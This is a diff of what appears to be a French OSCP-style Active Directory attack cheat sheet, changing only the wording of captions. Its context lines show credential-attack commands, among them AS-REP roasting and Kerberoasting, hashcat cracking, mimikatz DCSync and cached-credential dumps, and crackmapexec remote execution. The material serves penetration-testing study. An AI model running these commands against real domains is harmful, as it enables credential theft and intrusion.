@@ -44,7 +44,7 @@ GetNPUsers.py domain/[user]:[password]@[dc-ip] -no-pass
 
 ```
 
-<p class="oscp-command-note">Tester des empreintes hors ligne avec hashcat.</p>
+<p class="oscp-command-note">Tester les hachages avec Hashcat.</p>
 
 ```bash
 hashcat -m 18200 [asrep_hashes_file].txt /usr/share/wordlists/rockyou.txt
@@ -90,7 +90,7 @@ Rubeus.exe kerberoast /outfile:[output_file].kerberoast
 
 ```
 
-<p class="oscp-command-note">Tester des empreintes hors ligne avec hashcat.</p>
+<p class="oscp-command-note">Tester les hachages avec Hashcat.</p>
 
 ```bash
 hashcat -m 13100 [kerberoast_hashes_file].txt /usr/share/wordlists/rockyou.txt
@@ -234,7 +234,7 @@ net use \\domaincontroller\C$ /user:[DesiredUsername]
 
 Examiner les objets, les droits et les services du domaine.
 
-<p class="oscp-command-note">Examiner les informations AD ou réseau en PowerShell.</p>
+<p class="oscp-command-note">Afficher les informations AD ou réseau en PowerShell.</p>
 
 ```powershell
 Get-ADGroupMember -Identity "Domain Admins"
@@ -269,7 +269,7 @@ mimikatz # lsadump::dcsync /domain:domain.com > output.txt
 
 ```
 
-<p class="oscp-command-note">Tester des empreintes hors ligne avec hashcat.</p>
+<p class="oscp-command-note">Tester les hachages avec Hashcat.</p>
 
 ```bash
 hashcat -m 1000 [hashes_file].txt /usr/share/wordlists/rockyou.txt
@@ -305,7 +305,7 @@ mimikatz # lsadump::cache
 
 ```
 
-<p class="oscp-command-note">Tester des empreintes hors ligne avec hashcat.</p>
+<p class="oscp-command-note">Tester les hachages avec Hashcat.</p>
 
 ```bash
 hashcat -m 1000 [cached_hash].txt /usr/share/wordlists/rockyou.txt
@@ -1208,7 +1208,7 @@ Find-DomainShare -Writable
 
 ```
 
-<p class="oscp-command-note">Examiner les informations AD ou réseau en PowerShell.</p>
+<p class="oscp-command-note">Afficher les informations AD ou réseau en PowerShell.</p>
 
 ```powershell
 Get-ADGroupMember -Identity "Domain Admins"
@@ -1248,7 +1248,7 @@ crackmapexec winrm [IP] -u [VALID_USERNAME] -p [VALID_PASSWORD] --exec-method in
 
 ```
 
-<p class="oscp-command-note">Interroger les objets de l&#x27;annuaire LDAP.</p>
+<p class="oscp-command-note">Interroger les objets LDAP.</p>
 
 ```bash
 ldapsearch -x -h [IP] -p 9389
